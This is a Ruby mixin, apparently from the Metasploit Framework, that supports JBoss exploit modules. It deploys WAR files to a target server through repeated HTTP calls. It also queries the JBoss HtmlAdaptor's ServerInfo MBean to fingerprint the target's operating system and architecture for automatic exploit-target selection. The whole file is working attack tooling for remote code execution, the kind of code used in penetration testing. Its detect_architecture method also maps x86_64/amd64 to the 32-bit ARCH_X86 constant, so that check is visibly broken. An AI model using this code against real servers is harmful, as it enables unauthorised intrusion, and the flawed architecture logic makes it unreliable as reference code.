# -*- coding: binary -*-

module Msf::HTTP::JBoss::Base

  # Deploys a WAR through HTTP uri invoke
  #
  # @param opts [Hash] Hash containing {Exploit::Remote::HttpClient#send_request_cgi} options
  # @param num_attempts [Integer] The number of attempts
  # @return [Rex::Proto::Http::Response, nil] The {Rex::Proto::Http::Response} response if exists, nil otherwise
  def deploy(opts = {}, num_attempts = 5)
    uri = opts['uri']

    if uri.blank?
      return nil
    end

    # JBoss might need some time for the deployment. Try 5 times at most and
    # wait 5 seconds inbetween tries
    num_attempts.times do |attempt|
      res = send_request_cgi(opts, 5)
      msg = nil
      if res.nil?
        msg = "Execution failed on #{uri} [No Response]"
      elsif res.code == 200
        vprint_status("Successfully called '#{uri}'")
        return res
      else
        msg = "http request failed to #{uri} [#{res.code}]"
      end

      if attempt < num_attempts - 1
        msg << ", retrying in 5 seconds..."
        vprint_status(msg)
        Rex.sleep(5)
      else
        print_error(msg)
        return res
      end
    end
  end

  # Provides the HTTP verb used
  #
  # @return [String] The HTTP verb in use
  def http_verb
    datastore['VERB']
  end


  # Try to auto detect the target architecture and platform
  #
  # @param [Array] available_targets The available targets
  # @return [Msf::Module::Target, nil] The detected target or nil
  def auto_target(available_targets)
    if http_verb == 'HEAD'
      print_status("Sorry, automatic target detection doesn't work with HEAD requests")
    else
      print_status("Attempting to automatically select a target...")
      res = query_serverinfo
      plat = detect_platform(res)
      unless plat
        print_warning('Unable to detect platform!')
        return nil
      end

      arch = detect_architecture(res)
      unless arch
        print_warning('Unable to detect architecture!')
        return nil
      end

      # see if we have a match
      available_targets.each { |t| return t if t['Platform'] == plat && t['Arch'] == arch }
    end

    # no matching target found, use Java as fallback
    java_targets = available_targets.select {|t| t.name =~ /^Java/ }

    java_targets[0]
  end

  # Query the server information from HtmlAdaptor
  #
  # @return [Rex::Proto::Http::Response, nil] The {Rex::Proto::Http::Response} response or nil
  def query_serverinfo
    path = normalize_uri(target_uri.path.to_s, 'HtmlAdaptor')
    res = send_request_cgi(
      {
        'uri'    => path,
        'method' => http_verb,
        'vars_get' =>
        {
          'action' => 'inspectMBean',
          'name' => 'jboss.system:type=ServerInfo'
        }
      })

    unless res && res.code == 200
      print_error("Failed: Error requesting #{path}")
      return nil
    end

    res
  end

  # Try to autodetect the target platform
  #
  # @param res [Rex::Proto::Http::Response] the http response where fingerprint platform from
  # @return [String, nil] The target platform or nil
  def detect_platform(res)
    if res && res.body =~ /<td.*?OSName.*?(Linux|FreeBSD|Windows).*?<\/td>/m
      os = $1
      if (os =~ /Linux/i)
        return 'linux'
      elsif (os =~ /FreeBSD/i)
        return 'linux'
      elsif (os =~ /Windows/i)
        return 'win'
      end
    end

    nil
  end

  # Try to autodetect the target architecture
  #
  # @param res [Rex::Proto::Http::Response] the http response where fingerprint architecture from
  # @return [String, nil] The target architecture or nil
  def detect_architecture(res)
    if res && res.body =~ /<td.*?OSArch.*?(x86|i386|i686|x86_64|amd64).*?<\/td>/m
      arch = $1
      if arch =~ /(x86|i386|i686)/i
        return ARCH_X86
      elsif arch =~ /(x86_64|amd64)/i
        return ARCH_X86
      end
    end

    nil
  end
end
